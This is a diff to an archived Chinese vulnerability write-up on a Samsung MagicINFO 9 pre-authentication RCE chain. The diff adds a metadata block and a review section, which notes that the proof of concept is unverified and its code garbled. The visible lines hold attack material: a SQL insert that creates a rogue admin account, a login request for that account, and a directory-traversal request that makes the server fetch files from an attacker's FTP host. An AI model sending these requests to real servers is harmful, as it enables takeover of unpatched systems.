@@ -1,8 +1,55 @@
 ---
 source: "gelusus/wxvl 公众号漏洞文库"
+id: "vw-74d68cdcd54452ecdd2db451"
+entity_id: "ve-74d68cdcd54452ecdd2db451"
+schema_version: "1"
+title: "Samsung MagicINFO 9 预认证 RCE 漏洞链分析 - TOCTOU 竞争与目录遍历导致认证绕过"
+product: "Samsung MagicINFO 9 Server"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "primary"
+primary_identifiers: "CVE-2025-54446"
+referenced_identifiers: ""
+prerequisites: "测试21.1080.0，默认PostgreSQL、周期校验任务、可控FTP；XSS分支需已登录用户访问，文件执行分支另行配置允许扩展名"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E4%B8%89%E6%98%9FMagicINFO/Samsung%20MagicINFO%209%20%E9%A2%84%E8%AE%A4%E8%AF%81%20RCE%20%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%88%86%E6%9E%90%20-%20TOCTOU%20%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%AF%BC%E8%87%B4%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87.md"
+review_date: "2026-10-02"
+side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
+source_status: "unknown"
 ---
 
 #  Samsung MagicINFO 9 预认证 RCE 漏洞链分析 - TOCTOU 竞争与目录遍历导致认证绕过  
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：Samsung MagicINFO 9 Server
+- 本文讨论：SRC-2025-0003与SRC-2025-0004；CVE-2025-54446/54438为前序补丁/变体参考
+- 版本、权限与配置前提：测试21.1080.0，默认PostgreSQL、周期校验任务、可控FTP；XSS分支需已登录用户访问，文件执行分支另行配置允许扩展名
+- 资料类型：漏洞链技术分析转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- Java/XML代码多处丢换行，注释吞噬后续代码，logger片段截断，不可直接复制复现
+- PoC“这里”无实际链接；修复版本未给
+- 标题强调TOCTOU，正文主要详述路径归一化及定时数据库链，具体检查/使用竞态窗口未清楚展开
+- 无社工描述不能省略XSS分支用户访问条件；SYSTEM与部署权限应关联
+- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+
+### 操作风险与恢复
+
+- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本
+
+### 待核与来源
+
+- 新漏洞官方CVE映射、修复构建和TOCTOU根因需原源核验；前序CVE不自动归为主漏洞
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 SOURCE INCITE
                     SOURCE INCITE  securitainment   2026-02-06 08:50  
   
@@ -286,7 +333,7 @@ insert into mi_user_info_user (user_id, user_name, password, email, organization
   
 执行上述查询后，攻击者就能添加一个管理员用户 hacker:7v4e2R1DeD3kCoZ4j3  
 。接下来就可以用下面这个请求登录：  
-```
+```http
 POST /MagicInfo/restapi/v2.0/auth HTTP/1.1Host: [target]:7001Content-Type: application/jsonContent-Length: 88{ "password": "7v4e2R1DeD3kCoZ4j3", "username": "hacker", "osName": "Linux", "osVersion": "1337"}
 ```  
   
@@ -345,7 +392,7 @@ server 下载并再次覆盖index.html
 ，从而实现认证绕过！  
   
 概念验证：  
-```
+```http
 GET /MagicInfo/servlet/FtpFileDownloadServlet?ftpLoginId=user&ftpPassword=pwd&ftpIp=[attacker]&ftpPort=2121&ftpDirectory=test%5c..%5c..%5c..%5c..%5cserver%5c HTTP/1.1Host: [target]:7002Accept: application/json
 ```  
   
